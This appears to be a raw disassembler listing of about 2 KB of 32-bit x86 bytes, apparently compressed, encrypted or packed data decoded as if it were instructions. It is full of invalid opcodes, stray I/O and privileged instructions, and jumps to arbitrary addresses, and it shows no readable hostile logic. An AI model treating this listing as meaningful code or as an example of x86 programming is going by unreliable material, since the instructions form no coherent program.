  41d800:	add    al,0x7d
  41d802:	add    BYTE PTR [edi+0x19],0x52
  41d806:	xor    al,0x76
  41d808:	mov    esp,eax
  41d80a:	ret    0xe6e4
  41d80d:	aad    0xc8
  41d80f:	sbb    DWORD PTR [edi],esp
  41d811:	icebp  
  41d812:	sbb    al,0x6f
  41d814:	ss cwde 
  41d816:	jle    0x41d878
  41d818:	lahf   
  41d819:	inc    BYTE PTR [edi+0x555183be]
  41d81f:	scas   al,BYTE PTR es:[edi]
  41d820:	mov    edx,DWORD PTR [edx]
  41d822:	jmp    0x41d81b
  41d824:	pop    eax
  41d825:	mov    ecx,0xfbed6afe
  41d82a:	mov    bh,BYTE PTR [edx+0x29]
  41d82d:	fistp  WORD PTR [edi-0x421281ef]
  41d833:	fiadd  WORD PTR [ebx+0x42]
  41d836:	retf   0xdd3c
  41d839:	push   ds
  41d83a:	iret   
  41d83b:	sub    edi,DWORD PTR ds:0xe1f73a42
  41d841:	xchg   esp,eax
  41d842:	hlt    
  41d843:	push   ss
  41d844:	pusha  
  41d845:	lods   al,BYTE PTR ds:[esi]
  41d846:	sub    eax,DWORD PTR [edi+esi*1]
  41d849:	pop    eax
  41d84a:	popa   
  41d84b:	call   0x7a68c4b6
  41d850:	inc    esp
  41d851:	push   esp
  41d852:	inc    edi
  41d853:	test   al,0x3b
  41d855:	jmp    0x6ab1867c
  41d85a:	xor    al,0xc2
  41d85c:	je     0x41d80d
  41d85e:	repnz pop ebp
  41d860:	fild   WORD PTR [edx-0x52856cfd]
  41d866:	jmp    0x41d86b
  41d868:	mov    ds:0xdf8ced29,al
  41d86d:	pop    ss
  41d86e:	sub    eax,0x808628a3
  41d873:	(bad)  
  41d875:	cmp    eax,0xf5f1b47c
  41d87a:	cld    
  41d87b:	loope  0x41d813
  41d87d:	push   ebx
  41d87e:	outs   dx,BYTE PTR ds:[esi]
  41d87f:	mov    eax,0x1d11823d
  41d884:	(bad)  [ebx]
  41d886:	jae    0x41d88a
  41d888:	push   eax
  41d889:	dec    ebp
  41d88a:	std    
  41d88b:	jno    0x41d8b8
  41d88d:	and    al,0xa5
  41d88f:	inc    edx
  41d890:	or     bl,BYTE PTR [ecx+0x30]
  41d893:	arpl   WORD PTR [esp+esi*1-0x6195f0a3],sp
  41d89a:	sub    al,0x3d
  41d89c:	jns    0x41d847
  41d89e:	das    
  41d89f:	fisttp DWORD PTR [eax]
  41d8a1:	out    0x42,al
  41d8a3:	or     BYTE PTR [ecx],bl
  41d8a5:	add    al,0xba
  41d8a7:	mov    ds:0x6f49a9f5,eax
  41d8ac:	sbb    dh,ah
  41d8ae:	or     al,BYTE PTR [ecx+0x22]
  41d8b1:	inc    ecx
  41d8b2:	jmp    0x41d898
  41d8b4:	scas   eax,DWORD PTR es:[edi]
  41d8b5:	xchg   DWORD PTR [ebx-0x33779ae6],ebx
  41d8bb:	aas    
  41d8bc:	dec    ebx
  41d8bd:	loope  0x41d8a9
  41d8bf:	in     al,dx
  41d8c0:	mov    bl,0x7c
  41d8c2:	popf   
  41d8c3:	aam    0xe3
  41d8c5:	xchg   esi,eax
  41d8c6:	and    BYTE PTR ds:0x67a4e648,ah
  41d8cc:	xor    eax,0xe5712726
  41d8d1:	xchg   esp,eax
  41d8d2:	shr    DWORD PTR [ebx],0x9c
  41d8d5:	(bad)  [edx-0x56]
  41d8d8:	stos   DWORD PTR es:[edi],eax
  41d8d9:	das    
  41d8da:	inc    DWORD PTR [edi+0x2a6a7d45]
  41d8e0:	mov    ch,0x5
  41d8e2:	inc    esi
  41d8e3:	adc    ch,0x5a
  41d8e6:	(bad)  
  41d8e7:	cmp    al,0xfa
  41d8e9:	mov    bl,al
  41d8eb:	adc    eax,ebx
  41d8ed:	xchg   esp,eax
  41d8ee:	dec    ebp
  41d8ef:	pop    ebx
  41d8f0:	fiadd  DWORD PTR [ecx+0x6a]
  41d8f3:	push   ds
  41d8f4:	stc    
  41d8f5:	fnstenv [edi-0x4e]
  41d8f8:	popf   
  41d8f9:	pop    ebp
  41d8fa:	sub    eax,0x1c02591e
  41d8ff:	icebp  
  41d900:	push   ds
  41d901:	in     al,0x3
  41d903:	nop
  41d904:	cdq    
  41d905:	mov    ss,eax
  41d907:	jb     0x41d964
  41d909:	popf   
  41d90a:	call   0x9cbcb54
  41d90f:	jmp    0x2c91d6e0
  41d914:	shl    DWORD PTR [eax+0x18],cl
  41d917:	xor    DWORD PTR [eax],0xa
  41d91a:	mov    gs,edx
  41d91c:	pop    eax
  41d91d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d91e:	inc    bh
  41d920:	repz mov al,0x40
  41d923:	mov    ebp,0x4097b1fc
  41d928:	out    0x14,eax
  41d92a:	xchg   edx,eax
  41d92b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d92c:	dec    edx
  41d92d:	mov    bl,0xc7
  41d92f:	leave  
  41d930:	ret    
  41d931:	mov    al,0x60
  41d933:	xlat   BYTE PTR ds:[ebx]
  41d934:	out    dx,al
  41d935:	lods   eax,DWORD PTR ds:[esi]
  41d936:	jmp    0x776d:0x36161a6e
  41d93d:	push   cs
  41d93e:	fnstenv [ebx]
  41d940:	idiv   BYTE PTR [edi+edx*1+0x13]
  41d944:	inc    edi
  41d945:	(bad)  [ebx+0x42]
  41d948:	dec    esi
  41d949:	nop
  41d94a:	mov    ecx,0x68356a42
  41d94f:	dec    esi
  41d950:	ds dec edi
  41d952:	push   esi
  41d953:	sub    DWORD PTR [ecx-0x3e01429e],ebp
  41d959:	idiv   BYTE PTR [edx+edi*8]
  41d95c:	or     eax,0xe1e78988
  41d961:	sar    BYTE PTR [eax-0x641e60ad],0x28
  41d968:	(bad)  
  41d969:	fdivr  DWORD PTR [edx]
  41d96b:	push   ebp
  41d96c:	mov    esi,0x8b795d46
  41d971:	mov    dl,0x16
  41d973:	ja     0x41d9e9
  41d975:	mov    ds:0x22710549,al
  41d97a:	hlt    
  41d97b:	ins    BYTE PTR es:[edi],dx
  41d97c:	xchg   esp,eax
  41d97d:	loopne 0x41d997
  41d97f:	(bad)  [ebp+0xb]
  41d982:	cwde   
  41d983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d984:	jbe    0x41d972
  41d986:	retf   
  41d987:	jecxz  0x41d92e
  41d989:	pop    ebx
  41d98a:	je     0x41da00
  41d98c:	pop    esp
  41d98d:	outs   dx,BYTE PTR ds:[esi]
  41d98e:	jns    0x41d9ab
  41d990:	xor    al,0xf2
  41d992:	jle    0x41d91f
  41d994:	fisttp QWORD PTR [eax-0x35c20af3]
  41d99a:	fdiv   QWORD PTR [ecx+edx*1+0x8]
  41d99e:	js     0x41d972
  41d9a0:	mov    edi,0x1cecff23
  41d9a5:	int3   
  41d9a6:	mov    eax,ds:0x7c2ceefa
  41d9ab:	out    dx,eax
  41d9ac:	push   ebx
  41d9ad:	sbb    BYTE PTR [esi-0xe813195],0x51
  41d9b4:	xor    bl,BYTE PTR [edi-0x4e]
  41d9b7:	sub    ebp,DWORD PTR [eax]
  41d9b9:	push   DWORD PTR [esi-0x1a36d2c6]
  41d9bf:	rcl    DWORD PTR [ebx-0x79366e3b],cl
  41d9c5:	out    0x9e,al
  41d9c7:	sbb    eax,0x2013055f
  41d9cc:	dec    BYTE PTR [ebx+ebp*8+0x6ff9f18f]
  41d9d3:	pop    edi
  41d9d4:	and    bh,BYTE PTR [eax+0x3b]
  41d9d7:	call   0xf849de0
  41d9dc:	xor    BYTE PTR [eax-0x3c9b4b8b],0x90
  41d9e3:	rcl    ebp,0x15
  41d9e6:	aaa    
  41d9e7:	adc    eax,0x1a28eaa2
  41d9ec:	in     eax,0xa2
  41d9ee:	sbb    al,0xc4
  41d9f0:	fistp  DWORD PTR [ecx-0x1f]
  41d9f3:	das    
  41d9f4:	mov    ds:0xd37231e2,eax
  41d9f9:	inc    eax
  41d9fa:	adc    bh,0xe1
  41d9fd:	push   ds
  41d9fe:	ss in  al,0x2a
  41da01:	retf   
  41da02:	fsubp  st(3),st
  41da04:	mov    DWORD PTR ds:0xe3216008,edi
  41da0a:	xor    al,BYTE PTR [ecx-0x6d0ed38b]
  41da10:	enter  0xd60b,0x5d
  41da14:	sti    
  41da15:	ret    
  41da16:	call   0x91986a1f
  41da1b:	(bad)  
  41da1c:	cmp    ch,BYTE PTR [ebp-0x56]
  41da1f:	ror    BYTE PTR [ebx-0x70],0x2c
  41da23:	out    0xd8,al
  41da25:	inc    esi
  41da26:	push   edi
  41da27:	repz adc ah,BYTE PTR [esi]
  41da2a:	stos   BYTE PTR es:[edi],al
  41da2b:	(bad)  
  41da2c:	(bad)  
  41da2d:	ja     0x41da91
  41da2f:	or     al,BYTE PTR [esi-0x16c66d44]
  41da35:	jmp    0x9df7402d
  41da3a:	or     esi,ebx
  41da3c:	mov    al,bh
  41da3e:	jmp    0xc62a:0x37a78764
  41da45:	or     bh,BYTE PTR [ecx]
  41da47:	pop    edx
  41da48:	fmul   DWORD PTR [esi+0x75]
  41da4c:	sar    BYTE PTR [edx+0x39e15e91],1
  41da52:	ret    0x3014
  41da55:	mov    BYTE PTR [edi+eiz*8],cl
  41da58:	ss ja  0x41da2d
  41da5b:	xor    DWORD PTR [edx+eiz*2],edi
  41da5e:	pop    ecx
  41da5f:	into   
  41da60:	adc    BYTE PTR [esi+ecx*2+0xbcc2a86],cl
  41da67:	mov    edx,0xb11fe2a9
  41da6c:	inc    eax
  41da6d:	in     al,0xd0
  41da6f:	lahf   
  41da70:	jno    0x41da09
  41da72:	xchg   edx,eax
  41da73:	cwde   
  41da74:	repnz ins BYTE PTR es:[edi],dx
  41da76:	fnstenv [edx+0x1d92b469]
  41da7c:	inc    eax
  41da7d:	out    0x4d,al
  41da7f:	jne    0x41da9b
  41da81:	jb     0x41da3b
  41da83:	mov    eax,0x7f7378c4
  41da88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da89:	int    0x22
  41da8b:	ja     0x41da81
  41da8d:	and    ecx,DWORD PTR [eax+0x1dd8697]
  41da93:	outs   dx,DWORD PTR ds:[esi]
  41da94:	cmp    al,0xb4
  41da96:	xchg   esp,eax
  41da97:	aaa    
  41da98:	dec    eax
  41da99:	fcomp  QWORD PTR [edi-0x31881532]
  41da9f:	mov    ebp,esp
  41daa1:	inc    eax
  41daa2:	cdq    
  41daa3:	lahf   
  41daa4:	aaa    
  41daa5:	aaa    
  41daa6:	sub    eax,0xaf789242
  41daab:	(bad)  
  41daac:	jg     0x41da83
  41daae:	sti    
  41daaf:	stos   BYTE PTR es:[edi],al
  41dab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dab1:	or     al,0x73
  41dab3:	fwait
  41dab4:	nop
  41dab5:	adc    eax,0x75c9a994
  41daba:	lock xchg edx,eax
  41dabc:	loop   0x41dab5
  41dabe:	shr    DWORD PTR [edx+0x52d6495f],0xb6
  41dac5:	int    0x71
  41dac7:	jmp    0x41db36
  41dac9:	push   eax
  41daca:	inc    DWORD PTR [ebp-0x426c26bd]
  41dad0:	sbb    al,0xec
  41dad2:	js     0x41daed
  41dad4:	je     0x41daa3
  41dad6:	xor    DWORD PTR [ecx-0x17c6d6a4],eax
  41dadc:	cli    
  41dadd:	pop    esi
  41dade:	test   DWORD PTR [ebx+0x1a],esi
  41dae1:	jmp    0x41db1e
  41dae3:	stos   BYTE PTR es:[edi],al
  41dae4:	icebp  
  41dae5:	test   BYTE PTR [edx+ecx*1+0x7],ah
  41dae9:	mov    bl,BYTE PTR [ebp-0x19b768a9]
  41daef:	ss xor al,0x3f
  41daf2:	(bad)  
  41daf3:	out    0xf3,al
  41daf5:	lahf   
  41daf6:	xlat   BYTE PTR ds:[ebx]
  41daf7:	adc    al,0xb4
  41daf9:	xchg   BYTE PTR [eax-0x60],dl
  41dafc:	jl     0x41dae1
  41dafe:	mov    ds:0x8b28b699,eax
  41db03:	es jmp 0x41dae1
  41db06:	pop    ecx
  41db07:	push   es
  41db08:	push   cs
  41db09:	inc    ecx
  41db0a:	ins    BYTE PTR es:[edi],dx
  41db0b:	dec    esi
  41db0c:	or     bl,BYTE PTR [ebp+0x63727e0c]
  41db12:	test   BYTE PTR [edx-0x2a],cl
  41db15:	pop    ss
  41db16:	outs   dx,DWORD PTR ds:[esi]
  41db17:	xchg   esi,eax
  41db18:	fxch   st(1)
  41db1a:	sub    ah,ch
  41db1c:	mov    esi,edi
  41db1e:	lahf   
  41db1f:	rcl    al,1
  41db21:	out    0xf1,eax
  41db23:	add    eax,0x10aa99e7
  41db28:	mov    bl,0xb2
  41db2a:	repnz mov dl,0x80
  41db2d:	or     eax,0xe55d5469
  41db32:	sbb    bh,BYTE PTR [edi+0x78ec4775]
  41db38:	sti    
  41db39:	jne    0x41dae0
  41db3b:	mov    ecx,0x55a14a8b
  41db40:	loopne 0x41db45
  41db42:	aaa    
  41db43:	add    BYTE PTR [ecx-0x6c88fe9f],ch
  41db49:	scas   eax,DWORD PTR es:[edi]
  41db4a:	fucom  st(5)
  41db4c:	dec    ebp
  41db4d:	fld    DWORD PTR ds:0x78faceb8
  41db53:	stos   DWORD PTR es:[edi],eax
  41db54:	fsub   st(7),st
  41db56:	pop    es
  41db57:	sub    edi,DWORD PTR fs:[esi-0x29dd9d60]
  41db5e:	and    dh,BYTE PTR [edx+eax*1-0x3b]
  41db62:	adc    cl,BYTE PTR [eax+0x12]
  41db65:	inc    ebp
  41db66:	add    al,0xca
  41db68:	(bad)  
  41db69:	std    
  41db6a:	fidiv  DWORD PTR [edi+0x48]
  41db6d:	(bad)  
  41db6e:	sbb    eax,0x9db213f0
  41db73:	setnp  BYTE PTR [edi+ebp*1]
  41db77:	je     0x41db13
  41db79:	mov    esi,0x4aad7e71
  41db7e:	clc    
  41db7f:	mov    BYTE PTR [eax],dl
  41db81:	popf   
  41db82:	stos   DWORD PTR es:[edi],eax
  41db83:	sahf   
  41db84:	sbb    BYTE PTR [esi],dh
  41db86:	(bad)
  41db89:	rcr    DWORD PTR [ebx-0x7d],cl
  41db8c:	pop    ds
  41db8d:	in     eax,0xeb
  41db8f:	mov    ds:0xc9a95b17,al
  41db94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db95:	jo     0x41db61
  41db97:	scas   al,BYTE PTR es:[edi]
  41db98:	jmp    0x614817f9
  41db9d:	pop    es
  41db9e:	sub    al,0x5d
  41dba0:	push   edi
  41dba1:	sbb    esp,ecx
  41dba3:	jmp    0x4d28:0x4b3b8a00
  41dbaa:	ss push eax
  41dbac:	inc    esi
  41dbad:	add    ebp,esp
  41dbaf:	ret    0xdfdc
  41dbb2:	mov    bh,BYTE PTR [ebx]
  41dbb4:	cld    
  41dbb5:	xchg   edi,eax
  41dbb6:	add    eax,0xe07a41cd
  41dbbb:	dec    eax
  41dbbc:	sub    DWORD PTR [ebx+0x6589e3a0],edx
  41dbc2:	mov    bl,0x91
  41dbc4:	jp     0x41db49
  41dbc6:	cwde   
  41dbc7:	loop   0x41dbe0
  41dbc9:	inc    edi
  41dbca:	jl     0x41dbe9
  41dbcc:	dec    esp
  41dbcd:	xor    eax,0xce48f720
  41dbd2:	xchg   esi,eax
  41dbd3:	push   ebx
  41dbd4:	cdq    
  41dbd5:	scas   eax,DWORD PTR es:[edi]
  41dbd6:	retf   0x6af6
  41dbd9:	adc    ch,BYTE PTR [ebx]
  41dbdb:	adc    al,0x46
  41dbdd:	pop    esp
  41dbde:	stos   BYTE PTR es:[edi],al
  41dbdf:	fiadd  WORD PTR [edx]
  41dbe1:	cmc    
  41dbe2:	popf   
  41dbe3:	add    al,0x2c
  41dbe5:	lock push 0xffffffee
  41dbe8:	sub    esi,DWORD PTR [ecx+0x640fe9ce]
  41dbee:	aam    0x66
  41dbf0:	add    al,BYTE PTR [edi]
  41dbf2:	es daa 
  41dbf4:	in     al,0xfc
  41dbf6:	popf   
  41dbf7:	inc    ebp
  41dbf8:	mov    gs,WORD PTR [edx]
  41dbfa:	cmp    al,BYTE PTR [edi+0x4c28404e]
  41dc00:	or     ebx,DWORD PTR [edx+0x2]
  41dc03:	jo     0x41dc75
  41dc05:	xlat   BYTE PTR ds:[ebx]
  41dc06:	mov    al,cl
  41dc08:	jb     0x41dc0d
  41dc0a:	xchg   esi,eax
  41dc0b:	(bad)  
  41dc0c:	ret    
  41dc0d:	psrlw  mm7,QWORD PTR [ecx-0x47]
  41dc11:	mov    gs,WORD PTR [edi+0x4e]
  41dc14:	dec    ebp
  41dc15:	pop    edx
  41dc16:	push   0xffffffa3
  41dc18:	xchg   ebx,eax
  41dc19:	xchg   esp,eax
  41dc1a:	sahf   
  41dc1b:	ret    
  41dc1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc1d:	cld    
  41dc1e:	sub    BYTE PTR [esi],al
  41dc20:	pop    esi
  41dc21:	popf   
  41dc22:	add    BYTE PTR [eax],cl
  41dc24:	fsub   DWORD PTR [eax]
  41dc26:	fst    DWORD PTR [edi+0x76]
  41dc29:	mov    edx,0x8c50e3cc
  41dc2e:	ja     0x41dc73
  41dc30:	jl     0x41dbb3
  41dc32:	mov    ds:0xa6f1566d,eax
  41dc37:	pop    edi
  41dc38:	fs pop edx
  41dc3a:	dec    eax
  41dc3b:	sbb    BYTE PTR [edi-0x67],0x52
  41dc3f:	push   cs
  41dc40:	(bad)  
  41dc41:	sar    ebp,cl
  41dc43:	ffree  st(7)
  41dc45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc46:	je     0x41dc5e
  41dc48:	cmp    eax,0xaebbd52b
  41dc4d:	popa   
  41dc4e:	ds mov ebp,0x119a49bc
  41dc54:	pop    ecx
  41dc55:	or     DWORD PTR [ecx-0x144d1963],ebx
  41dc5b:	cmc    
  41dc5c:	push   ecx
  41dc5d:	mov    WORD PTR [ebx+ebx*8-0x1e],ds
  41dc61:	iret   
  41dc62:	repnz pop edi
  41dc64:	adc    BYTE PTR [eax-0x1ba7ccb2],bh
  41dc6a:	aam    0xa8
  41dc6c:	push   esp
  41dc6d:	cmp    DWORD PTR [esi+0x5c0b3983],ebp
  41dc73:	and    bh,BYTE PTR [ecx+0x19fa482]
  41dc79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc7a:	data16 jb 0x41dc10
  41dc7d:	sbb    DWORD PTR [ebp+0x35d7d6b1],esi
  41dc83:	fucomi st,st(4)
  41dc85:	fwait
  41dc86:	pop    esi
  41dc87:	pop    esp
  41dc88:	add    DWORD PTR [eax+eiz*2-0x4c608e32],0x83e020c8
  41dc93:	ins    BYTE PTR es:[edi],dx
  41dc94:	mov    cl,0xca
  41dc96:	repz xor DWORD PTR [ecx-0x78],ebp
  41dc9a:	mov    ebx,0x636155d0
  41dc9f:	mov    ds,ebp
  41dca1:	and    edx,DWORD PTR ds:0xd7308085
  41dca7:	fldenv [edx+0x7a2e440b]
  41dcad:	pop    eax
  41dcae:	cdq    
  41dcaf:	retf   0xbae4
  41dcb2:	pusha  
  41dcb3:	imul   ebp,edi,0x5d
  41dcb6:	arpl   cx,bp
  41dcb8:	pushf  
  41dcb9:	mov    ebx,DWORD PTR [eax+0x1e]
  41dcbc:	hlt    
  41dcbd:	ret    0x405f
  41dcc0:	push   ebx
  41dcc1:	popa   
  41dcc2:	push   ebp
  41dcc3:	lock inc ecx
  41dcc5:	cwde   
  41dcc6:	jl     0x41dc7e
  41dcc8:	dec    edx
  41dcc9:	(bad)
  41dccc:	mov    bl,0x52
  41dcce:	push   0x7399aac
  41dcd3:	in     eax,0xec
  41dcd5:	mov    ds:0x9694c883,al
  41dcda:	mov    ds:0xe1f7171a,al
  41dcdf:	fcom   DWORD PTR [esi]
  41dce1:	xor    dh,BYTE PTR [edx+ebx*8]
  41dce4:	nop
  41dce5:	mov    al,0x3
  41dce7:	adc    ebp,edx
  41dce9:	and    cl,bh
  41dceb:	ficom  DWORD PTR [edi-0x80]
  41dcee:	lahf   
  41dcef:	shl    ebp,cl
  41dcf1:	sbb    al,0xac
  41dcf3:	jp     0x41dd67
  41dcf5:	mov    bl,0xc6
  41dcf7:	inc    esi
  41dcf8:	sahf   
  41dcf9:	sar    DWORD PTR [esi],cl
  41dcfb:	xor    eax,0x39e0b6c9
  41dd00:	popf   
  41dd01:	and    ebx,DWORD PTR [eax]
  41dd03:	in     eax,0xb1
  41dd05:	mov    eax,0xc85faaf0
  41dd0a:	cmp    cx,WORD PTR [ebp-0x56]
  41dd0e:	imul   BYTE PTR [ebp-0x2817f542]
  41dd14:	lods   eax,DWORD PTR ds:[esi]
  41dd15:	ins    DWORD PTR es:[edi],dx
  41dd16:	and    ah,BYTE PTR [edi-0x78abf569]
  41dd1c:	add    esi,esi
  41dd1e:	(bad)  
  41dd1f:	shl    bh,cl
  41dd21:	sahf   
  41dd22:	inc    ecx
  41dd23:	lods   eax,DWORD PTR ds:[esi]
  41dd24:	imul   edx,DWORD PTR [ecx+0x44],0x38305d70
  41dd2b:	mov    WORD PTR [ecx],fs
  41dd2d:	add    esp,0x8536c742
  41dd33:	(bad)  
  41dd34:	ins    BYTE PTR es:[edi],dx
  41dd35:	sub    DWORD PTR [eax-0x3e],esp
  41dd38:	aad    0x8f
  41dd3a:	fnstcw WORD PTR [eax-0x3a7355d1]
  41dd40:	(bad)  
  41dd41:	(bad)  
  41dd42:	icebp  
  41dd43:	(bad)  
  41dd44:	cld    
  41dd45:	(bad)  
  41dd46:	(bad)  
  41dd47:	dec    BYTE PTR [ebx+0x2a27532c]
  41dd4d:	jne    0x41dd13
  41dd4f:	add    eax,0x697ebe5f
  41dd54:	popf   
  41dd55:	bound  edi,QWORD PTR [edx+0x379ae178]
  41dd5b:	cmp    DWORD PTR ds:0xab31d5f8,ebp
  41dd61:	mov    ah,0x1
  41dd63:	mov    ds:0x17e25b79,eax
  41dd68:	xlat   BYTE PTR ds:[ebx]
  41dd69:	mov    ch,0x4c
  41dd6b:	in     al,0x4d
  41dd6d:	out    0xd8,al
  41dd6f:	pusha  
  41dd70:	test   al,0x7a
  41dd72:	xor    BYTE PTR [edx+0x644d8262],cl
  41dd78:	fldln2 
  41dd7a:	aaa    
  41dd7b:	clc    
  41dd7c:	ficom  DWORD PTR [edx+esi*8-0x58]
  41dd80:	jmp    0x445044f6
  41dd85:	mov    edi,0x1f6a1c38
  41dd8a:	nop
  41dd8b:	sub    bl,ah
  41dd8d:	xor    DWORD PTR [eax-0x4e36f064],0x6c322b20
  41dd97:	aaa    
  41dd98:	mov    esi,0x88a28d9e
  41dd9d:	(bad)  
  41dd9e:	push   0xffffff99
  41dda0:	cmc    
  41dda1:	mov    ecx,0xf0eaae56
  41dda6:	into   
  41dda7:	scas   eax,DWORD PTR es:[edi]
  41dda8:	xchg   edi,eax
  41dda9:	in     eax,0xbb
  41ddab:	inc    edx
  41ddac:	dec    eax
  41ddad:	and    al,0x85
  41ddaf:	inc    esp
  41ddb0:	test   BYTE PTR [edx-0x69f77dc5],al
  41ddb6:	sub    edi,DWORD PTR [edx+eax*4-0x4a]
  41ddba:	jmp    0x41de25
  41ddbc:	xor    eax,DWORD PTR [ebx]
  41ddbe:	sub    DWORD PTR [ebp+0x10f70858],0x2c21e6c7
  41ddc8:	and    DWORD PTR [eax-0x19e66bea],ecx
  41ddce:	dec    eax
  41ddcf:	(bad)  
  41ddd1:	xor    BYTE PTR [edx],ah
  41ddd3:	or     al,0x2d
  41ddd5:	outs   dx,BYTE PTR ds:[esi]
  41ddd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddd7:	add    BYTE PTR [edx+ecx*8+0x3f],ch
  41dddb:	cmp    al,0xf7
  41dddd:	ficom  WORD PTR [edx-0x70]
  41dde0:	jne    0x41dd64
  41dde2:	xor    al,BYTE PTR [edi+0x11]
  41dde5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dde6:	in     eax,0x1b
  41dde8:	xchg   edi,eax
  41dde9:	mov    ebp,0x445db6e
  41ddee:	jge    0x41ddb4
  41ddf0:	hlt    
  41ddf1:	test   BYTE PTR [edx],0x92
  41ddf4:	push   ebx
  41ddf5:	xor    DWORD PTR [edx],0x51978adc
  41ddfb:	xchg   edx,eax
  41ddfc:	(bad)  
  41ddfd:	fisubr WORD PTR [esi+ecx*2-0x41cbdf6c]
  41de04:	dec    esp
  41de05:	lds    ebp,FWORD PTR [edi]
  41de07:	data16 mov cl,0xac
  41de0a:	cmp    bl,cl
  41de0c:	(bad)  
  41de0e:	inc    esp
  41de0f:	pop    esp
  41de10:	rcl    esp,1
  41de12:	sbb    bp,di
  41de15:	cs out dx,eax
  41de17:	je     0x41de53
  41de19:	sub    ebp,esi
  41de1b:	mov    edi,0x2d48ca24
  41de20:	repnz or DWORD PTR [ecx+0x65dcf4ce],ebp
  41de27:	and    ebx,esp
  41de29:	inc    DWORD PTR [ebx-0x519f4cfa]
  41de2f:	mov    DWORD PTR [esi-0x7f],eax
  41de32:	sub    BYTE PTR [ebx-0x392c4fab],al
  41de38:	fs push ecx
  41de3a:	inc    edi
  41de3b:	pop    esp
  41de3c:	xlat   BYTE PTR ds:[ebx]
  41de3d:	add    eax,0xb6d1759b
  41de42:	adc    eax,0xd54f62a4
  41de47:	fwait
  41de48:	sub    eax,0x31fe36fd
  41de4d:	dec    ecx
  41de4e:	jb     0x41de7c
  41de50:	test   eax,0x77816ab6
  41de55:	sahf   
  41de56:	leave  
  41de57:	pop    edx
  41de58:	push   cs
  41de59:	in     eax,0x9
  41de5b:	(bad)  
  41de5c:	pop    edx
  41de5d:	fist   WORD PTR [ebp-0x4e0db94b]
  41de63:	push   ebp
  41de64:	inc    eax
  41de65:	mov    esp,0x693f749a
  41de6a:	fsub   st(1),st
  41de6c:	das    
  41de6d:	jnp    0x41de7f
  41de6f:	sub    eax,0xb705ea6
  41de74:	pop    ss
  41de75:	cdq    
  41de76:	aas    
  41de77:	sub    BYTE PTR [ebx-0x7],0xc4
  41de7b:	daa    
  41de7c:	fld    DWORD PTR [eax-0x6b]
  41de7f:	sbb    esi,0x24b1e42
  41de85:	xchg   esp,eax
  41de86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de87:	rcl    BYTE PTR [ebp-0x47e5f73c],0x1d
  41de8e:	mov    al,0x6
  41de90:	mov    eax,ds:0x4e0b9d18
  41de95:	inc    ebp
  41de96:	js     0x41de31
  41de98:	fcomp  DWORD PTR [ecx]
  41de9a:	outs   dx,BYTE PTR ds:[esi]
  41de9b:	mov    dh,al
  41de9d:	add    al,0xb4
  41de9f:	addr16 test esp,esi
  41dea2:	dec    ebx
  41dea3:	jo     0x41def2
  41dea5:	fs cwde 
  41dea7:	lds    esp,FWORD PTR [ebx+0x40]
  41deaa:	sbb    eax,0x8a52927b
  41deaf:	test   DWORD PTR [ebx-0x5d0d546a],edx
  41deb5:	mov    edi,0xf9ace288
  41deba:	cdq    
  41debb:	cmp    ebx,DWORD PTR [ebx-0x5d]
  41debe:	add    ecx,DWORD PTR [ebp+0x34]
  41dec1:	cwde   
  41dec2:	adc    eax,0x327be3e0
  41dec7:	jl     0x41ded7
  41dec9:	jmp    0xf48d:0xcb5044d2
  41ded0:	push   edx
  41ded1:	xor    eax,0xbe2617dd
  41ded6:	adc    ebx,edx
  41ded8:	in     al,0x5c
  41deda:	addr16 mov al,ds:0x74d9
  41dede:	inc    esp
  41dedf:	aam    0x93
  41dee1:	js     0x41df4c
  41dee3:	imul   eax,DWORD PTR [ebp-0x5c],0xfffffffa
  41dee7:	cwde   
  41dee8:	inc    esp
  41dee9:	test   al,0xd3
  41deeb:	push   ebp
  41deec:	add    BYTE PTR [esi+0x77],bh
  41deef:	les    esp,FWORD PTR [edx+ecx*2+0xa]
  41def3:	jne    0x41deba
  41def5:	rcl    DWORD PTR [eax-0x51],0x11
  41def9:	jmp    0xbc5c:0x14e4991d
  41df00:	push   ebp
  41df01:	adc    BYTE PTR [edx+edx*8-0x1a09307e],ch
  41df08:	fadd   st(4),st
  41df0a:	xchg   ebx,eax
  41df0b:	ins    BYTE PTR es:[edi],dx
  41df0c:	inc    sp
  41df0e:	lock cld 
  41df10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df11:	jne    0x41dec3
  41df13:	jp     0x41df3f
  41df15:	sti    
  41df16:	popa   
  41df17:	push   cs
  41df18:	stos   DWORD PTR es:[edi],eax
  41df19:	pop    esp
  41df1a:	and    esi,DWORD PTR [ebx-0x71]
  41df1d:	xchg   esi,eax
  41df1e:	fisttp QWORD PTR [ecx+0x56]
  41df21:	pop    ds
  41df22:	mov    edx,0x9bf7807
  41df27:	mov    esp,0xb1af2130
  41df2c:	jno    0x41df97
  41df2e:	mov    bl,0x59
  41df30:	mov    BYTE PTR [ebp+eiz*4-0x16],0x82
  41df35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df36:	mov    al,ds:0xcc049e9b
  41df3b:	dec    ecx
  41df3c:	fild   QWORD PTR [edi]
  41df3e:	test   al,0xf7
  41df40:	inc    edx
  41df41:	pop    edx
  41df42:	jmp    0x67e8589
  41df47:	(bad)
  41df4a:	in     eax,0x59
  41df4c:	lds    ebx,FWORD PTR [edi+0x635f37b3]
  41df52:	mov    al,ds:0x6fe75f5e
  41df57:	xchg   ebx,eax
  41df58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df59:	outs   dx,DWORD PTR ds:[esi]
  41df5a:	sub    DWORD PTR [ebp-0x3f],0xea5d4b83
  41df61:	push   esi
  41df62:	out    dx,eax
  41df63:	jecxz  0x41df75
  41df65:	scas   eax,DWORD PTR es:[edi]
  41df66:	and    BYTE PTR [eax-0x59],bl
  41df69:	pushf  
